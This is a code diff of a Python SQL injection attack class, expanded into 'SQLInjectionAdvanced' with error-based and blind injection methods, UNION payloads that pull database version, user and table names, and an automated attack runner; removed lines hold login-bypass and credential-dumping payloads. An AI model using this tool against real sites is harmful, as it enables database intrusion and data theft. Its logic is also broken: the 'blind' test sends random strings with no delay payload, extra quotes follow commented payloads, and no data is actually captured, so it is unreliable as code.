@@ -1,39 +1,90 @@
 import requests
 import random
 import string
+import time
 
-class SQLInjection:
-    def __init__(self, target_url):
+class SQLInjectionAdvanced:
+    def __init__(self, target_url, vulnerable_param, headers=None):
         self.target_url = target_url
+        self.vulnerable_param = vulnerable_param
+        self.headers = headers if headers else {'User-Agent': 'Mozilla/5.0'}
+        self.db_info = {}
 
-    def generate_payload(self):
+    def generate_payload(self, length=12):
         """
-        Generate advanced SQL injection payloads.
+        Generate a random string for SQL injection payload.
         """
-        payloads = [
-            "' OR '1'='1'; --",
-            "' UNION SELECT null, username, password FROM users --",
-            "' AND 1=0 UNION SELECT null, table_name, column_name FROM information_schema.columns --"
-        ]
-        return random.choice(payloads)
+        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
-    def test_injection(self, payload):
+    def error_based_injection(self, payload):
         """
-        Test SQL injection payload on the target.
+        Try error-based SQL injection to extract information from the database.
         """
+        sql_error_payload = f"{self.vulnerable_param}={payload}'"
+        url = f"{self.target_url}?{sql_error_payload}"
+
         try:
-            response = requests.get(self.target_url, params={'username': payload, 'password': 'any'})
-            if "error" in response.text or "syntax" in response.text:
-                print(f"Potential SQL Injection vulnerability detected with payload: {payload}")
-            else:
-                print(f"Payload {payload} executed successfully.")
+            response = requests.get(url, headers=self.headers)
+            if "error" in response.text or "mysql" in response.text.lower():
+                print(f"Error-based SQL injection successful with payload: {payload}")
+                return True
         except requests.exceptions.RequestException as e:
-            print(f"Error testing payload: {e}")
+            print(f"Error during error-based injection: {e}")
+        return False
 
-    def run_sql_injection(self):
+    def blind_sql_injection(self, payload):
         """
-        Run multiple SQL injection tests on the target.
+        Perform blind SQL injection by checking response time or page content.
         """
-        for _ in range(5):
-            payload = self.generate_payload()
-            self.test_injection(payload)
+        sql_blind_payload = f"{self.vulnerable_param}={payload}'"
+        url = f"{self.target_url}?{sql_blind_payload}"
+
+        try:
+            start_time = time.time()
+            response = requests.get(url, headers=self.headers)
+            end_time = time.time()
+            if (end_time - start_time) > 2:  # Long delay indicates successful injection
+                print(f"Blind SQL injection successful with payload: {payload}")
+                return True
+        except requests.exceptions.RequestException as e:
+            print(f"Error during blind SQL injection: {e}")
+        return False
+
+    def extract_db_info(self):
+        """
+        Try extracting database version, user, and tables using SQL injection.
+        """
+        # Extract Database Version
+        payload = "1' UNION SELECT NULL, VERSION(), NULL--"
+        if self.error_based_injection(payload):
+            print("Database version extracted using error-based injection.")
+
+        # Extract Database User
+        payload = "1' UNION SELECT NULL, USER(), NULL--"
+        if self.error_based_injection(payload):
+            print("Database user extracted using error-based injection.")
+
+        # Extract Tables
+        payload = "1' UNION SELECT NULL, GROUP_CONCAT(table_name), NULL FROM information_schema.tables--"
+        if self.error_based_injection(payload):
+            print("Database tables extracted using error-based injection.")
+
+    def automated_attack(self):
+        """
+        Execute SQL Injection attack with both error-based and blind SQL injection techniques.
+        """
+        print(f"Launching SQL Injection attack on {self.target_url} targeting parameter: {self.vulnerable_param}")
+        
+        # Blind SQL Injection attack
+        payload = self.generate_payload()
+        if self.blind_sql_injection(payload):
+            print("Successfully exploited blind SQL injection.")
+
+        # Error-based SQL Injection attack
+        self.extract_db_info()
+
+    def run_attack(self):
+        """
+        Run the attack with a more sophisticated approach.
+        """
+        self.automated_attack()
